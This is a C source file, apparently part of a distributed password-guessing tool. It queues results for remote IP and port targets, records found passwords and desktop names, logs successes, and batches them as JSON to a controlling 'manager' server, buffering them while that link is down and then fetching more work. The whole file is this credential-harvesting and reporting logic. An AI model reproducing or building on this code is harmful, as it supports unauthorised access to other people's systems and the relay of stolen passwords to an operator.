#include "includes.h"

static CRITICAL_SECTION csQueue;
static PQUEUE_ITEM lpQueue=NULL,lpLastQueue=NULL,
                   lpUnsentQueue=NULL,lpLastUnsentQueue=NULL;

static cJSON *IOCP_GetQueuedResult(PQUEUE_ITEM lpItem)
{
    cJSON *jsResult=cJSON_CreateObject();
    if (jsResult)
    {
        cJSON_AddIntToObject(jsResult,"ip",lpItem->dwIP);
        cJSON_AddIntToObject(jsResult,"port",lpItem->wPort);
        cJSON_AddIntToObject(jsResult,"idx",lpItem->dwIdx);
        cJSON_AddIntToObject(jsResult,"result",lpItem->dwResult);

        if (lpItem->dwResult == WKR_RESULT_DONE)
        {
            if (lpItem->szPassword[0])
                cJSON_AddStringToObject(jsResult,"pwd",lpItem->szPassword);

            cJSON_AddStringToObject(jsResult,"desk",lpItem->szDesktop);
        }
    }
    return jsResult;
}

void WINAPI IOCP_ResultsQueueThread(LPVOID)
{
    InitializeCriticalSection(&csQueue);
    lpQueue=NULL;
    lpLastQueue=NULL;
    lpUnsentQueue=NULL;
    lpLastUnsentQueue=NULL;

    while (true)
    {
        bool bEnd=(WaitForSingleObject(hShutdownEvent,1) == WAIT_OBJECT_0);
        if ((bEnd) || (IOCP_IsStopped()))
        {
            if (InterlockedExchangeAdd(&dwActiveTasks,0))
            {
                Sleep(1);
                continue;
            }
        }

        DWORD dwResults=0;
        if (lpQueue)
        {
            if (siManager.bConnected)
            {
                PQUEUE_ITEM lpItem=NULL;

                EnterCriticalSection(&csQueue);
                {
                    lpItem=lpQueue;

                    lpQueue=NULL;
                    lpLastQueue=NULL;
                }
                LeaveCriticalSection(&csQueue);

                cJSON *jsResults=cJSON_CreateArray();
                do
                {
                    cJSON *jsResult=IOCP_GetQueuedResult(lpItem);
                    if (jsResult)
                    {
                        cJSON_AddItemToArray(jsResults,jsResult);

                        if (lpItem->dwResult != WKR_RESULT_IN_USE)
                            dwResults++;
                    }

                    PQUEUE_ITEM lpNext=lpItem->lpNext;
                    MemFree(lpItem);

                    lpItem=lpNext;
                }
                while (lpItem);

                SendResults(jsResults);

                if ((!IOCP_IsStopped()) && (dwResults))
                    GetItems();
            }
            else
            {
                EnterCriticalSection(&csQueue);
                {
                    if (lpUnsentQueue)
                        lpLastUnsentQueue->lpNext=lpQueue;
                    else
                        lpUnsentQueue=lpQueue;

                    lpLastUnsentQueue=lpLastQueue;

                    lpQueue=NULL;
                    lpLastQueue=NULL;
                }
                LeaveCriticalSection(&csQueue);
            }
        }

        if ((IOCP_IsStopped()) && (siManager.bConnected))
        {
            if (!dwResults)
                SendResults(cJSON_CreateArray());
        }

        if (bEnd)
            break;
    }
    return;
}

cJSON *IOCP_QueueGetUnsentResults()
{
    cJSON *jsResults=cJSON_CreateArray();
    if (jsResults)
    {
        PQUEUE_ITEM lpItem=NULL;
        EnterCriticalSection(&csQueue);
        {
            lpItem=lpUnsentQueue;
            lpUnsentQueue=NULL;
            lpLastUnsentQueue=NULL;
        }
        LeaveCriticalSection(&csQueue);

        while (lpItem)
        {
            cJSON_AddItemToArray(jsResults,IOCP_GetQueuedResult(lpItem));

            PQUEUE_ITEM lpNext=lpItem->lpNext;
            MemFree(lpItem);

            lpItem=lpNext;
        }
    }
    return jsResults;
}

void IOCP_QueueResultItem(PQUEUE_ITEM lpItem)
{
    EnterCriticalSection(&csQueue);
    {
        do
        {
            if (!lpItem)
                break;

            PQUEUE_ITEM lpLastItem=lpItem;
            while (lpLastItem->lpNext)
                lpLastItem=lpLastItem->lpNext;

            if (!lpQueue)
            {
                lpQueue=lpItem;
                lpLastQueue=lpLastItem;
                break;
            }

            lpLastQueue->lpNext=lpItem;
            lpLastQueue=lpLastItem;
        }
        while (false);
    }
    LeaveCriticalSection(&csQueue);
    return;
}

void Log_Append(PQUEUE_ITEM lpItem);
void IOCP_QueueResult(DWORD dwIP,WORD wPort,DWORD dwIdx,LPCSTR lpPassword,LPCSTR lpDesktop,WORKER_RESULT dwResult)
{
    PQUEUE_ITEM lpItem=(PQUEUE_ITEM)MemQuickAlloc(sizeof(*lpQueue));
    if (lpItem)
    {
        lpItem->dwIP=dwIP;
        lpItem->wPort=wPort;
        lpItem->dwIdx=dwIdx;
        lpItem->dwResult=dwResult;

        lpItem->szPassword[0]=0;
        lpItem->szDesktop[0]=0;
        lpItem->lpNext=NULL;

        if (dwResult == WKR_RESULT_DONE)
        {
            if (lpPassword)
                lstrcpyA(lpItem->szPassword,lpPassword);

            if (lpDesktop)
                lstrcpyA(lpItem->szDesktop,lpDesktop);

            Log_Append(lpItem);
        }

        IOCP_QueueResultItem(lpItem);
    }
    return;
}

